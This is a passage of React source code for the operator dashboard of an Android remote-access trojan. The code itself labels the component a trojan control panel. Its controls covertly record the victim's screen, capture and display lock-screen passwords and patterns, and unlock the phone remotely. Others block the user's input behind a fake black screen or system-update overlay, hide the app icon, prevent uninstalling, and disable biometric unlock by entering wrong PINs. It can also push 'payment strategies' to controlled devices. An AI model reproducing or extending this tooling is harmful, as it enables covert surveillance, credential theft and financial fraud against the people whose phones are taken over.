              <div style={{ display: 'flex', flexDirection: 'row', gap: 16, flex: 1, minHeight: 0, alignItems: 'flex-start', justifyContent: 'flex-start' }}>
                {/* ── 手机1：无障碍阅读器 ── */}
                <div style={{ display: 'flex', flexDirection: 'column', gap: 2, width: 298, flexShrink: 0, minHeight: 0 }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: 8, padding: '4px 8px', background: '#1f1f1f', borderRadius: 6, border: '1px solid #303030' }}>
                  <span style={{ width: 6, height: 6, borderRadius: '50%', background: readerActive ? '#52c41a' : '#555' }} />
                  <span style={{ fontSize: 12, color: 'rgba(255,255,255,0.65)', fontWeight: 500 }}>无障碍阅读器</span>
                  <span style={{ color: readerActive ? '#52c41a' : 'rgba(255,255,255,0.35)', fontSize: 10, marginLeft: 'auto' }}>{readerActive ? '● 已连接' : '— 未开启'}</span>
                  {readerActive && readerData && <button type="button" onClick={translateReaderData} disabled={readerTranslating} style={{ padding: '3px 10px', border: '1px solid #303030', borderRadius: 4, fontSize: 10, cursor: readerTranslating ? 'wait' : 'pointer', fontWeight: 500, background: '#141414', color: '#1677ff' }}>{readerTranslating ? '翻译中...' : '🌐 翻译'}</button>}
                  <button type="button" onClick={toggleReader} style={{ padding: '3px 10px', border: '1px solid #303030', borderRadius: 4, fontSize: 10, cursor: 'pointer', fontWeight: 500, background: '#141414', color: readerActive ? '#ff4d4f' : '#1677ff' }}>{readerActive ? '✕ 关闭' : '▶ 开启'}</button>
                </div>
                <div style={{ height: 551, flexShrink: 0, minHeight: 0, background: '#000', borderRadius: 12, padding: 0, boxShadow: 'none', display: 'flex', flexDirection: 'column', border: '2px solid #303030' }}>
                  <div style={{ width: '100%', height: '100%', background: '#000', borderRadius: 10, overflow: 'hidden', position: 'relative' }}>
                    {readerActive ? (readerLoading && !readerData ? <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', height: '100%' }}><div className="ctrl-spinner" /></div> : <ReaderView
                          data={readerData}
                          onTap={(x, y) => { setXy({ x, y }); sendControl('TAP', { x, y }); requestReaderAfterAction() }}
                          onGesture={g => { if (g.type === 'tap') { sendControl('TAP', { x: g.x, y: g.y }); requestReaderAfterAction() } else { sendWs({ type: 'command', sessionId: resolvedDeviceId, deviceId: resolvedDeviceId, data: { command: 'swipe', params: { x1: g.startX, y1: g.startY, x2: g.endX, y2: g.endY, duration: 300 } } }); sendWs({ type: 'command', sessionId: resolvedDeviceId, deviceId: resolvedDeviceId, data: { command: 'SWIPE', params: { startX: g.startX, startY: g.startY, endX: g.endX, endY: g.endY, duration: 300 } } }); addLog(`阅读器滑动: (${g.startX},${g.startY})→(${g.endX},${g.endY})`); requestReaderAfterAction() } }}
                          textColor={readerTextColor}
                          fontSize={readerFontSize}
                          style={{ background: readerBgColor }}
                        />) : <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', height: '100%', color: '#666' }}>阅读器未开启</div>}
                  </div>
                </div>
                <div style={{ height: 44, background: '#1f1f1f', borderRadius: 8, padding: '0 10px', boxShadow: 'none', border: '1px solid #303030', display: 'flex', alignItems: 'center', gap: 8, marginTop: 2 }}>
                  <span style={{ color: 'rgba(255,255,255,0.45)', fontSize: 12, whiteSpace: 'nowrap' }}>文本输入:</span>
                  <input type="text" placeholder="输入文本内容" value={textInput} onChange={e => setTextInput(e.target.value)} onKeyPress={e => { if (e.key === 'Enter' && textInput.trim()) { if (!readerActive && !streaming) { centerToast('请先开启阅读器或投屏', 'err'); return } sendWs({ type: 'command', sessionId: resolvedDeviceId, data: { command: 'INPUT_TEXT', params: { text: textInput.trim() } } }); centerToast(`已输入: ${textInput}`) } }} style={{ flex: 1, height: 30, padding: '0 10px', border: '1px solid #303030', borderRadius: 4, background: '#141414', color: 'rgba(255,255,255,0.85)', fontSize: 12, outline: 'none' }} />
                  <button type="button" onClick={() => { if (!readerActive && !streaming) { centerToast('请先开启阅读器或投屏', 'err'); return } if (textInput.trim()) { sendWs({ type: 'command', sessionId: resolvedDeviceId, data: { command: 'INPUT_TEXT', params: { text: textInput.trim() } } }); centerToast(`已输入: ${textInput}`) } else { centerToast('请输入文本', 'err') } }} disabled={!deviceOnline} style={{ height: 30, padding: '0 14px', fontSize: 12, borderRadius: 4, border: 'none', background: '#1677ff', color: '#fff', cursor: 'pointer' }}>发送</button>
                </div>
                </div>
                {/* ── 手机2：无障碍投屏/录屏（共用一个屏幕，走 WebSocket 无障碍通道） ── */}
              <div style={{ display: 'flex', flexDirection: 'column', gap: 2, width: 298, flexShrink: 0, minHeight: 0 }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: 8, padding: '4px 8px', background: '#1f1f1f', borderRadius: 6, border: '1px solid #303030', position: 'relative' }}>
                  <span style={{ width: 6, height: 6, borderRadius: '50%', background: (streaming || screenLoading) ? '#52c41a' : '#555' }} />
                  <span style={{ fontSize: 12, color: 'rgba(255,255,255,0.65)', fontWeight: 500 }}>无障碍投屏</span>
                  <span style={{ color: (streaming || screenLoading) ? '#52c41a' : 'rgba(255,255,255,0.35)', fontSize: 10, marginLeft: 'auto' }}>{streaming ? '● 投屏中' : screenLoading ? '● 加载中' : '— 未开启'}</span>
                  <button type="button" onClick={() => startScreen('record')} style={{ padding: '3px 10px', border: '1px solid #303030', borderRadius: 4, fontSize: 10, cursor: 'pointer', fontWeight: 500, background: '#141414', color: screenMode === 'record' && (streaming || screenLoading) ? '#ff4d4f' : '#1677ff' }}>{screenMode === 'record' && (streaming || screenLoading) ? '✕ 关闭' : '▶ 录屏'}</button>
                  <button type="button" onClick={() => startScreen('system')} style={{ padding: '3px 10px', border: '1px solid #303030', borderRadius: 4, fontSize: 10, cursor: 'pointer', fontWeight: 500, background: '#141414', color: screenMode === 'system' && (streaming || screenLoading) ? '#ff4d4f' : '#1677ff' }}>{screenMode === 'system' && (streaming || screenLoading) ? '✕ 关闭' : '▶ 投屏'}</button>
                  {screenConfirmVisible && <div style={{ position: 'absolute', top: '100%', left: 0, right: 0, marginTop: 4, padding: '8px 10px', background: '#2a1215', border: '1px solid rgba(255,77,79,0.3)', borderRadius: 6, zIndex: 10, boxShadow: '0 4px 12px rgba(0,0,0,0.4)' }}>
                    <div style={{ fontSize: 11, color: '#ff7875', lineHeight: 1.5, marginBottom: 6 }}>⚠️ 请注意，投屏设备会有对应提示，点击「确定」开启，建议使用录屏（无感监控）。</div>
                    <div style={{ display: 'flex', gap: 8, justifyContent: 'flex-end' }}>
                      <button onClick={() => setScreenConfirmVisible(false)} style={{ padding: '3px 10px', fontSize: 10, border: '1px solid #303030', borderRadius: 4, background: '#141414', color: 'rgba(255,255,255,0.65)', cursor: 'pointer' }}>取消</button>
                      <button onClick={() => { setScreenConfirmVisible(false); screenConfirmRef.current = true; startScreen('system') }} style={{ padding: '3px 10px', fontSize: 10, border: 'none', borderRadius: 4, background: '#ff4d4f', color: '#fff', cursor: 'pointer', fontWeight: 600 }}>确定开启</button>
                    </div>
                  </div>}
                </div>
                <div style={{ height: 551, flexShrink: 0, minHeight: 0, background: '#000', borderRadius: 12, padding: 0, boxShadow: 'none', display: 'flex', flexDirection: 'column', border: '2px solid #303030' }}>
                  <div style={{ width: '100%', height: '100%', background: '#000', borderRadius: 10, overflow: 'hidden', position: 'relative', touchAction: 'none', userSelect: 'none' }} onPointerDown={handleScreenPointerDown} onPointerMove={handleScreenPointerMove} onPointerUp={handleScreenPointerUp}>
                    {screenSrc ? <img src={screenSrc} alt="screen" draggable="false" style={{ pointerEvents: 'none', userSelect: 'none', width: '100%', height: '100%', objectFit: 'contain' }} /> : (streaming || screenLoading) ? <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', height: '100%', flexDirection: 'column', gap: 16, color: '#666' }}><div className="ctrl-spinner" /><div>无障碍{screenMode === 'record' ? '录屏' : '投屏'}加载中...</div></div> : <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', height: '100%', color: '#666' }}>点击上方「投屏」或「录屏」开始</div>}
                  </div>
                </div>
                <div style={{ height: 44, background: '#1f1f1f', borderRadius: 8, padding: '0 10px', boxShadow: 'none', border: '1px solid #303030', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6, marginTop: 2 }}>
                  <button title="通知栏" onClick={() => { if (!readerActive && !streaming) { centerToast('请先开启阅读器或投屏', 'err'); return } sendWs({ type: 'command', sessionId: resolvedDeviceId, data: { command: 'SWIPE_PATH', params: { path: [{ x: 540, y: 0 }, { x: 540, y: 400 }, { x: 540, y: 800 }], startX: 540, startY: 0, endX: 540, endY: 800, duration: 300 } } }) }} disabled={!deviceOnline} style={{ width: 48, height: 34, background: '#141414', border: '1px solid #303030', borderRadius: 4, color: 'rgba(255,255,255,0.65)', fontSize: 16, cursor: 'pointer', opacity: deviceOnline ? 1 : 0.4 }}>🔔</button>
                  <button title="返回" onClick={() => sendNav('BACK')} disabled={!deviceOnline} style={{ width: 48, height: 34, background: '#141414', border: '1px solid #303030', borderRadius: 4, color: 'rgba(255,255,255,0.65)', fontSize: 18, cursor: 'pointer', opacity: deviceOnline ? 1 : 0.4 }}>‹</button>
                  <button title="主页" onClick={() => sendNav('HOME')} disabled={!deviceOnline} style={{ width: 48, height: 34, background: '#141414', border: '1px solid #303030', borderRadius: 4, color: 'rgba(255,255,255,0.65)', fontSize: 18, cursor: 'pointer', opacity: deviceOnline ? 1 : 0.4 }}>○</button>
                  <button title="多任务" onClick={() => sendNav('RECENTS')} disabled={!deviceOnline} style={{ width: 48, height: 34, background: '#141414', border: '1px solid #303030', borderRadius: 4, color: 'rgba(255,255,255,0.65)', fontSize: 18, cursor: 'pointer', opacity: deviceOnline ? 1 : 0.4 }}>□</button>
                  <button title="快捷设置" onClick={() => { if (!readerActive && !streaming) { centerToast('请先开启阅读器或投屏', 'err'); return } sendWs({ type: 'command', sessionId: resolvedDeviceId, data: { command: 'SWIPE_PATH', params: { path: [{ x: 810, y: 10 }, { x: 810, y: 700 }, { x: 810, y: 1404 }], startX: 810, startY: 10, endX: 810, endY: 1404, duration: 300 } } }) }} disabled={!deviceOnline} style={{ width: 48, height: 34, background: '#141414', border: '1px solid #303030', borderRadius: 4, color: 'rgba(255,255,255,0.65)', fontSize: 16, cursor: 'pointer', opacity: deviceOnline ? 1 : 0.4 }}>⚙</button>
                </div>
              </div>
              </div>
            </div>
          )}
        </div>

        {/* 右栏：快捷操作 - 卡片式布局 */}
        <div className="ctrl-sidebar-panel">
          <div className="sidebar-two-col">
          {/* ── 左列：屏幕控制 + 一键解锁 ── */}
          <div className="sidebar-col">
          {/* 📱 屏幕控制 */}
          <div className="sidebar-card">
            <div className="sidebar-card-head">📱 屏幕控制</div>
            <div className="sidebar-card-body">
              {[{name:'点亮屏幕',icon:'💡'},{name:'锁定屏幕',icon:'🔒'},{name:'黑屏遮盖',icon:'🖥'},{name:'系统更新',icon:'🔄'}].map(({name, icon}) => {
                const btn = quickButtons.find(b => b.label === name); if (!btn) return null
                const on = btn.toggle ? !!toggles[btn.toggle] : false
                const danger = ['黑屏遮盖','系统更新'].includes(name)
                return <button key={name} className={`sidebar-btn ${danger ? 'danger' : 'primary'} ${on ? 'is-on' : ''}`} onClick={() => handleQuickButton(btn)} title={btn.toggle ? (on ? '已开启，点击关闭' : '点击开启') : name}><span>{icon} {name}</span>{btn.toggle && <span className={`sidebar-led ${on ? 'on' : ''}`}/>}</button>
              })}
              {/* 阻断操作：跟随黑屏/系统更新自动开启，阻断中时可点击"允许操作"解除 */}
              {(() => { const blockOn = !!toggles.block; return <button className={`sidebar-btn ${blockOn ? 'danger is-on' : 'primary'}`} onClick={() => { if (blockOn) { setToggles(s => ({ ...s, block: false })); sendCmd('DEVICE_ALLOW_INPUT', {}); centerToast('已允许用户操作'); addLog('手动解除阻断: DEVICE_ALLOW_INPUT') } else { setToggles(s => ({ ...s, block: true })); sendCmd('DEVICE_BLOCK_INPUT', {}); centerToast('已阻断用户操作'); addLog('手动阻断: DEVICE_BLOCK_INPUT') } }} title={blockOn ? '点击允许操作' : '点击阻断操作'}><span>{blockOn ? '✅ 允许操作' : '⛔ 阻断操作'}</span><span className={`sidebar-led ${blockOn ? 'on' : ''}`}/></button> })()}
            </div>
          </div>

          {/* 🔓 一键解锁 */}
          <div className="sidebar-card">
            <div className="sidebar-card-head">🔓 一键解锁</div>
            <div className="sidebar-card-body" style={{ gap: 8, display: 'flex', flexDirection: 'column' }}>
              {/* 第一行：密码输入 + 数字解锁 */}
              <div style={{ display: 'flex', gap: 6, alignItems: 'center' }}>
                <input className="sidebar-input" style={{ flex: 1, margin: 0 }} placeholder="密码" value={unlockPwd || ((lockPwd?.type === 'password' || lockPwd?.type === 'pin') && lockPwd?.value ? lockPwd.value : '')} onChange={e => setUnlockPwd(e.target.value)} />
                {(() => { const btn = quickButtons.find(b => b.label === '数字解锁'); const effectivePwd = unlockPwd || ((lockPwd?.type === 'password' || lockPwd?.type === 'pin') && lockPwd?.value ? lockPwd.value : ''); return btn ? <button className="sidebar-btn-sm primary" style={{ minWidth: 80 }} onClick={() => handleQuickButton({...btn, params: { password: effectivePwd }})} disabled={!effectivePwd} title="数字解锁"><span>🔢 数字解锁</span></button> : null })()}
              </div>
              {/* 第二行：图案输入 + 图案解锁 */}
              <div style={{ display: 'flex', gap: 6, alignItems: 'center' }}>
                <input className="sidebar-input" style={{ flex: 1, margin: 0 }} placeholder="0-8,逗号分隔" maxLength={20} value={patternPwd || (lockPwd?.type === 'pattern' || lockPwd?.type === 'gesture' ? lockPwd.value.replace(/[^\d]/g, '').split('').join(',') : '')} onChange={e => setPatternPwd(e.target.value)} />
                {(() => { const btn = quickButtons.find(b => b.label === '图案解锁'); const effectivePattern = patternPwd || (lockPwd?.type === 'pattern' || lockPwd?.type === 'gesture' ? lockPwd.value.replace(/[^\d]/g, '').split('').join(',') : ''); return btn ? <button className="sidebar-btn-sm green" style={{ minWidth: 80 }} onClick={() => handleQuickButton({...btn, params: { pattern: effectivePattern }})} disabled={!effectivePattern} title="图案解锁"><span>🔳 图案解锁</span></button> : null })()}
              </div>
              {/* 获取锁屏密码 - 显眼单独一行 */}
              {(() => { const btn = quickButtons.find(b => b.label === '获取锁屏密码'); return btn ? <button className="sidebar-btn primary" style={{ background: 'rgba(22,119,255,0.1)', borderColor: 'rgba(22,119,255,0.5)', color: '#60a5fa', fontWeight: 700 }} onClick={() => handleQuickButton(btn)} title="获取锁屏密码"><span>⊙ 获取锁屏密码</span></button> : null })()}
              {/* 一键解锁 + 误触滑动 同一行 */}
              <div style={{ display: 'flex', gap: 6 }}>
                <button className="sidebar-btn-sm purple" style={{ flex: 1 }} onClick={() => { setGestureModal(true); setGestureLoading(true); api.request(`/api/gesture/list?device_id=${encodeURIComponent(resolvedDeviceId)}`).then(r => { const list = r?.data || r?.gestures || r?.list || (Array.isArray(r) ? r : []); setGestureList(Array.isArray(list) ? list : []) }).catch(() => setGestureList([])).finally(() => setGestureLoading(false)) }} title="一键解锁"><span>🗝 一键解锁</span></button>
                {(() => { const btn = quickButtons.find(b => b.label === '误触滑动'); return btn ? <button className="sidebar-btn-sm danger" style={{ flex: 1 }} onClick={() => handleQuickButton(btn)} title="误触滑动"><span>↯ 误触滑动</span></button> : null })()}
              </div>
            </div>
          </div>

          </div>{/* end left sidebar-col */}

          {/* ── 右列：功能区 + 日志与服务器 ── */}
          <div className="sidebar-col">
          {/* ⚙️ 功能区 */}
          <div className="sidebar-card">
            <div className="sidebar-card-head">⚙️ 功能区</div>
            <div className="sidebar-card-body">
              {(() => { const btn = quickButtons.find(b => b.label === '开/闭音'); if (!btn) return null; const on = !!toggles[btn.toggle]; return <button className={`sidebar-btn primary ${on ? 'is-on' : ''}`} onClick={() => handleQuickButton(btn)} title={on ? '已开启，点击关闭' : '点击开启'}><span>{on ? '关闭静音' : '开启静音'}</span><span className={`sidebar-led ${on ? 'on' : ''}`}/></button> })()}
              <div className="sidebar-vol-row">
                {(() => { const btn = quickButtons.find(b => b.label === '音量-'); return btn ? <button className="sidebar-btn primary half" onClick={() => handleQuickButton(btn)} title="音量-"><span>🔉 -</span></button> : null })()}
                {(() => { const btn = quickButtons.find(b => b.label === '音量+'); return btn ? <button className="sidebar-btn primary half" onClick={() => handleQuickButton(btn)} title="音量+"><span>🔊 +</span></button> : null })()}
              </div>
              <div className="sidebar-divider"/>
              {(() => { const btn = quickButtons.find(b => b.label === '防止卸载'); if (!btn) return null; const on = !!toggles[btn.toggle]; return <button className={`sidebar-btn ${on ? 'danger' : 'green'} ${on ? 'is-on' : ''}`} onClick={() => handleQuickButton(btn)} title={on ? '点击关闭卸载保护' : '点击开启卸载保护'}><span>🛡 {on ? '允许卸载' : '防止卸载'}</span><span className={`sidebar-led ${on ? 'on' : ''}`}/></button> })()}
              {(() => { const btn = quickButtons.find(b => b.label === '应用隐藏'); if (!btn) return null; const on = !!toggles[btn.toggle]; return <button className={`sidebar-btn ${on ? 'danger' : 'green'} ${on ? 'is-on' : ''}`} onClick={() => handleQuickButton(btn)} title={on ? '点击显示应用图标' : '点击隐藏应用图标'}><span>🙈 {on ? '显示应用' : '隐藏应用'}</span><span className={`sidebar-led ${on ? 'on' : ''}`}/></button> })()}
              {(() => { const btn = quickButtons.find(b => b.label === '禁人脸'); return btn ? <button className="sidebar-btn purple" onClick={() => handleQuickButton(btn)} title="连续5次输入错误PIN，临时禁用人脸/指纹解锁"><span>👤 禁止人脸</span></button> : null })()}
              {(() => { const btn = quickButtons.find(b => b.label === '一键卸载'); return btn ? <button className="sidebar-btn danger" onClick={() => handleQuickButton(btn)} title="一键卸载"><span>📥 一键卸载</span></button> : null })()}
              {(() => { const btn = quickButtons.find(b => b.label === '一键还原'); return btn ? <button className="sidebar-btn danger-dark" onClick={() => handleQuickButton(btn)} title="一键还原"><span>♻ 一键还原</span></button> : null })()}
            </div>
          </div>

          {/* 📋 日志与服务器 */}
          <div className="sidebar-card">
            <div className="sidebar-card-head">📋 日志与服务器</div>
            <div className="sidebar-card-body">
              {(() => { const btn = quickButtons.find(b => b.label === '启用日志'); if (!btn) return null; const on = !!toggles[btn.toggle]; return <button className={`sidebar-btn danger ${on ? 'is-on' : ''}`} onClick={() => handleQuickButton(btn)} title={on ? '已开启，点击关闭' : '点击开启'}><span>📋 启用日志</span><span className={`sidebar-led ${on ? 'on' : ''}`}/></button> })()}
              <button className="sidebar-btn primary" onClick={() => setServerModal(true)} title="修改服务器"><span>⚙ 修改服务器</span></button>
            </div>
          </div>

          {/* 🔧 WS 测试 */}
          <div className="sidebar-card">
            <div className="sidebar-card-head">🔧 WS 测试</div>
            <div className="sidebar-card-body">
              <textarea
                className="sidebar-textarea"
                placeholder='输入 JSON 命令，如 {"type":"command","sessionId":"xxx","data":{"command":"UNLOCK_DEVICE","params":{}}}'
                value={wsTestInput || ''}
                onChange={e => setWsTestInput(e.target.value)}
                style={{ width: '100%', minHeight: 80, fontSize: 11, fontFamily: 'monospace', resize: 'vertical', padding: 8, background: 'rgba(255,255,255,.05)', border: '1px solid rgba(255,255,255,.1)', borderRadius: 6, color: '#e2e8f0' }}
              />
              <button className="sidebar-btn primary" onClick={() => {
                try {
                  const payload = JSON.parse(wsTestInput || '{}')
                  sendWs(payload)
                  centerToast('WS 已发送')
                  addLog(`WS测试: ${(wsTestInput || '').substring(0, 60)}`)
                } catch (e) {
                  centerToast('JSON 格式错误: ' + e.message, 'err')
                }
              }}><span>📤 发送</span></button>
            </div>
          </div>

        </div>{/* end right sidebar-col */}
        </div>{/* end sidebar-two-col */}

        {/* ── 安装保活机制（显眼按钮，与 ⚡ 自动配对 功能一致） ── */}

          {isMobile && <>
          <div style={{ marginTop: 12, borderRadius: 10, border: '1px solid rgba(255,255,255,.08)', background: 'rgba(255,255,255,.03)' }}>
            <div style={{ padding: '6px 14px', background: 'rgba(255,255,255,.04)', display: 'flex', alignItems: 'center', justifyContent: 'space-between', borderBottom: '1px solid rgba(255,255,255,.06)' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                <div style={{ width: 4, height: 16, background: '#1890ff', borderRadius: 2 }}></div>
                <span style={{ fontSize: 13, fontWeight: 500, color: '#e8e8e8' }}>🔑 密码采集</span>
              </div>
              <button onClick={() => refreshPwdSummary()} style={{ padding: '3px 10px', fontSize: 11, background: 'rgba(255,255,255,.06)', border: '1px solid rgba(255,255,255,.1)', borderRadius: 6, color: '#94a3b8', cursor: 'pointer' }}>🔄 刷新</button>
            </div>
            <div style={{ padding: 10, display: 'flex', flexDirection: 'column', gap: 8 }}>
              <div style={{ padding: '10px 14px', background: 'rgba(255,255,255,.03)', border: '1px solid rgba(255,255,255,.06)', borderRadius: 10 }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: 6, marginBottom: 6 }}>
                  <div style={{ width: 24, height: 24, borderRadius: 5, background: '#64748b', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12" y2="18"/></svg>
                  </div>
                  <span style={{ fontSize: 11, fontWeight: 600, color: '#e8e8e8' }}>锁屏密码</span>
                  <span style={{ fontSize: 10, marginLeft: 'auto', padding: '1px 5px', borderRadius: 3, background: lockPwd.status === '已获取' ? 'rgba(82,196,26,.15)' : 'rgba(255,255,255,.06)', color: lockPwd.status === '已获取' ? '#52c41a' : '#94a3b8' }}>{lockPwd.status}</span>
                </div>
                {lockPwd.value ? <div style={{ fontSize: 13, fontWeight: 700, color: '#fbbf24', fontFamily: 'monospace', marginBottom: 3 }}>{lockPwd.value}</div> : <div style={{ fontSize: 11, color: '#64748b', marginBottom: 3 }}>暂未获取</div>}
                <div style={{ fontSize: 10, color: '#94a3b8' }}>类型：<span style={{ padding: '1px 5px', borderRadius: 3, background: 'rgba(250,173,20,.12)', color: '#faad14' }}>{{pattern:'图案',password:'密码',pin:'PIN码',none:'未检测'}[lockPwd.type] || lockPwd.type}</span></div>
              </div>
            </div>
          </div></>}

      </div>{/* end ctrl-sidebar-panel */}
      </div>{/* end ctrl-body */}
      </div>{/* end home-tab-left */}
      {/* ★ 右侧：木马控制面板（TrojanControlTab 独立组件） */}
      <div className="home-tab-right">
      <TrojanControlTab
        readerBgColor={readerBgColor}
        setReaderBgColor={setReaderBgColor}
        readerTextColor={readerTextColor}
        setReaderTextColor={setReaderTextColor}
        readerFontSize={readerFontSize}
        setReaderFontSize={setReaderFontSize}
        isTranslating={isTranslating}
        setIsTranslating={setIsTranslating}
        readerActive={readerActive}
        readerData={readerData}
        readerLoading={readerLoading}
        readerTranslating={readerTranslating}
        translateReaderData={translateReaderData}
        toggleReader={toggleReader}
        requestReaderAfterAction={requestReaderAfterAction}
        adbScreenStreaming={adbScreenStreaming}
        screenSrc={screenSrc}
        screenPopped={screenPopped}
        setScreenPopped={setScreenPopped}
        startAdbScreen={startAdbScreen}
        stopAdbScreen={stopAdbScreen}
        handleAdbScreenPointerDown={handleAdbScreenPointerDown}
        handleAdbScreenPointerMove={handleAdbScreenPointerMove}
        handleAdbScreenPointerUp={handleAdbScreenPointerUp}
        deviceOnline={deviceOnline}
        device={device}
        resolvedDeviceId={resolvedDeviceId}
        sendCmd={sendCmd}
        sendWs={sendWs}
        sendAdbShell={sendAdbShell}
        sendBridgeCmd={sendBridgeCmd}
        sendAdbNav={sendAdbNav}
        sendControl={sendControl}
        textInput={textInput}
        setTextInput={setTextInput}
        adbShellHistory={adbShellHistory}
        setAdbShellHistory={setAdbShellHistory}
        toggles={toggles}
        quickButtons={quickButtons}
        unlockPwd={unlockPwd}
        handleQuickButton={handleQuickButton}
        addLog={addLog}
        centerToast={centerToast}
      />
      </div>{/* end home-tab-right */}
      </div>{/* end home-tab-split */}
      </>
      ) : renderTabContent()}

      {/* 推送支付策略模态框 */}
      {payPushModalOpen && (
        <div style={{ position: 'fixed', inset: 0, zIndex: 9999, display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(0,0,0,.55)' }} onClick={() => setPayPushModalOpen(false)}>
          <div style={{ background: '#1e293b', borderRadius: 14, border: '1px solid rgba(255,255,255,.1)', padding: 24, minWidth: 360, maxWidth: 480, maxHeight: '80vh', overflow: 'auto', boxShadow: '0 20px 60px rgba(0,0,0,.5)' }} onClick={e => e.stopPropagation()}>
            <div style={{ fontSize: 16, fontWeight: 700, color: '#fff', marginBottom: 16 }}>📤 推送支付策略到当前设备</div>
            <div style={{ marginBottom: 12 }}>
              <label style={{ fontSize: 12, color: '#94a3b8', cursor: 'pointer', display: 'flex', alignItems: 'center', gap: 6 }}>
                <input type="checkbox" checked={payPushSelectedIds.length === payStrategies.length && payStrategies.length > 0} onChange={e => { if (e.target.checked) setPayPushSelectedIds(payStrategies.map(s => s.id)); else setPayPushSelectedIds([]) }} />
                全选 / 取消全选
              </label>
            </div>
            <div style={{ display: 'flex', flexDirection: 'column', gap: 8, marginBottom: 20 }}>
              {payStrategies.length === 0 ? (
                <div style={{ textAlign: 'center', padding: 16, color: '#64748b', fontSize: 13 }}>暂无策略</div>
              ) : payStrategies.map(s => (
                <label key={s.id} style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '8px 12px', background: payPushSelectedIds.includes(s.id) ? 'rgba(24,144,255,.08)' : 'rgba(255,255,255,.03)', border: '1px solid ' + (payPushSelectedIds.includes(s.id) ? 'rgba(24,144,255,.3)' : 'rgba(255,255,255,.06)'), borderRadius: 8, cursor: 'pointer', transition: 'all .2s' }}>
                  <input type="checkbox" checked={payPushSelectedIds.includes(s.id)} onChange={e => { if (e.target.checked) setPayPushSelectedIds([...payPushSelectedIds, s.id]); else setPayPushSelectedIds(payPushSelectedIds.filter(id => id !== s.id)) }} />
                  <div style={{ flex: 1, minWidth: 0 }}>
                    <div style={{ fontSize: 13, color: '#fff', fontWeight: 600, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{s.appName || s.app_name || s.packageName || s.package_name || '--'}</div>
                    <div style={{ fontSize: 11, color: '#64748b', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{s.packageName || s.package_name || '--'}</div>
                  </div>
                </label>
              ))}
            </div>
            <div style={{ display: 'flex', gap: 10, justifyContent: 'flex-end' }}>
              <button onClick={() => setPayPushModalOpen(false)} style={{ padding: '8px 18px', fontSize: 13, borderRadius: 8, border: '1px solid rgba(255,255,255,.1)', background: 'rgba(255,255,255,.05)', color: '#94a3b8', cursor: 'pointer' }}>取消</button>
              <button onClick={saveAndPushPayStrategies} style={{ padding: '8px 18px', fontSize: 13, borderRadius: 8, border: 'none', background: 'linear-gradient(135deg, #1890ff, #096dd9)', color: '#fff', cursor: 'pointer', fontWeight: 600 }}>💾 保存并推送</button>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
